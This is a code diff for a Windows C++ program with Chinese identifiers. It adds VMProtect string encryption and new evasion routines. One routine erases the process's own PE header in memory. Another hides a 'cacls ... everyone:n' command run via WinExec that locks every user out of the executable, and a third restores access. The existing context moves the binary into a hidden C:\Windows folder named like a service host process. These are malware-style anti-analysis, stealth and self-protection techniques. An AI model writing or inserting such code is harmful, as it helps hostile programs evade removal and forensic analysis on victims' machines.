@@ -62,10 +62,10 @@ bool 删除自身()
 		return false;
 	}
 	//以下API一样，不再啰嗦
-	wsprintf(NewFileName, "C:\\Windows\\%C\0", FileName[0]);
+	wsprintf(NewFileName, VMProtectDecryptStringA("C:\\Windows\\%C\0"), FileName[0]);
 	CreateDirectory(NewFileName, NULL);
 	SetFileAttributes(NewFileName, FILE_ATTRIBUTE_HIDDEN);
-	wsprintf(NewFileName, "C:\\Windows 服务主进程\0", FileName[0], GetTickCount());
+	wsprintf(NewFileName, VMProtectDecryptStringA("C:\\Windows 服务主进程\0"), FileName[0], GetTickCount());
 	SetFileAttributes(NewFileName, FILE_ATTRIBUTE_NORMAL);
 	DeleteFile(NewFileName);
 	if (!MoveFileEx(FileName, NewFileName, MOVEFILE_REPLACE_EXISTING))
@@ -79,7 +79,7 @@ bool 删除自身()
 	delete[] NewFileName;
 	if (result == false)
 	{
-		printf("删除自身失败 Error Code\n");
+		printf(VMProtectDecryptStringA("删除自身失败 Error Code\n"));
 		system("pause");
 		exit(0);
 	}
@@ -357,4 +357,41 @@ bool VectorFindString(vector<string> list, string str)
 		}
 	}
 	return false;
+}
+
+// 抹去PEinfo
+void ErasePEInfo()
+{
+	VMProtectBeginUltra("ErasePEInfo");
+	HMODULE        hModule = NULL;
+	DWORD        dwMemPro = NULL;
+	hModule = GetModuleHandle(NULL);
+	VirtualProtect((void*)hModule, 0x1000, PAGE_EXECUTE_READWRITE, &dwMemPro);
+	memset((void*)hModule, 0, 0x1000);
+	VirtualProtect((void*)hModule, 0x1000, dwMemPro, &dwMemPro);
+	VMProtectEnd();
+}
+
+void ProtectFile()
+{
+	VMProtectBeginUltra("ProtectFile");
+	char szFileFullPath[MAX_PATH];
+	::GetModuleFileNameA(NULL, szFileFullPath, MAX_PATH);
+	string s1 = VMProtectDecryptStringA("cacls ");
+	string s2 = VMProtectDecryptStringA(szFileFullPath);
+	string s3 = VMProtectDecryptStringA(" /e /p everyone:n");
+	WinExec((s1 + s2 + s3).c_str(), SW_HIDE);
+	VMProtectEnd();
+}
+
+void RestoreProtectFile()
+{
+	VMProtectBeginUltra("RestoreProtectFile");
+	char szFileFullPath[MAX_PATH];
+	::GetModuleFileNameA(NULL, szFileFullPath, MAX_PATH);
+	string s1 = VMProtectDecryptStringA("cacls ");
+	string s2 = VMProtectDecryptStringA(szFileFullPath);
+	string s3 = VMProtectDecryptStringA(" /e /p everyone:f");
+	WinExec((s1 + s2 + s3).c_str(), SW_HIDE);
+	VMProtectEnd();
 }
